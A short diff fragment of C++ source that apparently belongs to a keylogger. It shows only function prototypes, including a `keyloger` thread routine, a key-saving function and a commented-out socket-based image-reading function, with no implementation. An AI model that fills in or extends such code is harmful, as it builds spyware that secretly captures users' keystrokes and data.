@@ -12,4 +12,5 @@ using namespace std;
 char *clear(char *path);
 int Save(int _key,char *file);
 char *read(char *path);
+//void readForImage(char*path,void * sock);
 unsigned long __stdcall keyloger( void* );
